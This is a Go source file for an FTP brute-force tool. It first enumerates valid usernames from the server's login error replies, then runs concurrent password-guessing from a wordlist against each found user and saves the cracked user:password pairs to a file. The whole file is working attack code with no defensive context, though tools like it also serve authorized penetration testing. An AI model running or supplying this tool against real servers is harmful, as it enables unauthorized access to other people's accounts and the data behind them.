package main

import (
	"flag"
	"fmt"
	"github.com/jlaffaye/ftp"
	"github.com/zenthangplus/goccm"
	"os"
	"strings"
	"sync"
)

type login struct {
	user string
	pass string
}

var wg sync.WaitGroup
var users []string
var logins []login
var mutex sync.Mutex
var ccm goccm.ConcurrencyManager

func main() {
	ip := flag.String("ip", "127.0.0.2:21", "ftp server ip")
	users_file := flag.String("users", "", "users file")
	output_file := flag.String("output", "", "output file")
	passwords_file := flag.String("passwords", "", "passwords file")
	rate := flag.Int("rate", 5, "rate limit")
	flag.Parse()

	if *users_file == "" {
		fmt.Println("Usage: ftp [-ip <ip>] -users <users_file> [-passwords <passwords_file>] [-output <output_file>] [-rate <rate>]")
		return
	}

	file, err := os.ReadFile(*users_file)
	if err != nil {
		fmt.Println("Failed to read file:", err)
		return
	}

	ccm = goccm.New(*rate)

	lines := strings.Split(string(file), "\n")
	for _, user := range lines {
		if user == "" {
			continue
		}

		ccm.Wait()
		wg.Add(1)
		go bfUser(ip, user)
	}

	wg.Wait()

	fmt.Println("Users found:")
	for _, user := range users {
		fmt.Println(" - ", user)
	}

	if *passwords_file == "" {
		return
	}

	file, err = os.ReadFile(*passwords_file)
	if err != nil {
		fmt.Println("Failed to read file:", err)
		return
	}

	lines = strings.Split(string(file), "\n")
	for _, pass := range lines {
		if pass == "" {
			continue
		}

		for _, user := range users {
			ccm.Wait()
			wg.Add(1)
			go bfPass(ip, user, pass)
		}
	}

	wg.Wait()

	fmt.Println("Logins found:")
	for _, login := range logins {
		fmt.Println(" - ", login.user+":"+login.pass)
	}

	if *output_file == "" {
		return
	}

	f, err := os.Create(*output_file)
	if err != nil {
		fmt.Println("Failed to create file:", err)
		return
	}

	for _, login := range logins {
		f.WriteString(login.user + ":" + login.pass + "\n")
	}

	f.Close()

	fmt.Println("Logins saved to", *output_file)
}

func bfUser(ip *string, user string) {
	defer wg.Done()
	defer ccm.Done()
	client, err := ftp.Dial(*ip)
	if err != nil {
		fmt.Println("Failed to connect to server:", err)
		return
	}

	err = client.Login(user, user)
	if err != nil {
		if err.Error() == "530 Login incorrect." {
			mutex.Lock()
			users = append(users, user)
			mutex.Unlock()
		} else if err.Error() != "Permission denied." {
			fmt.Println("Unknown error while login:", err)
		}
		return
	}

	mutex.Lock()
	users = append(users, user)
	mutex.Unlock()
}

func bfPass(ip *string, user string, pass string) {
	defer wg.Done()
	defer ccm.Done()
	client, err := ftp.Dial(*ip)
	if err != nil {
		fmt.Println("Failed to connect to server:", err)
		return
	}

	err = client.Login(user, pass)
	if err != nil {
		return
	}

	mutex.Lock()
	logins = append(logins, login{user, pass})
	mutex.Unlock()
}
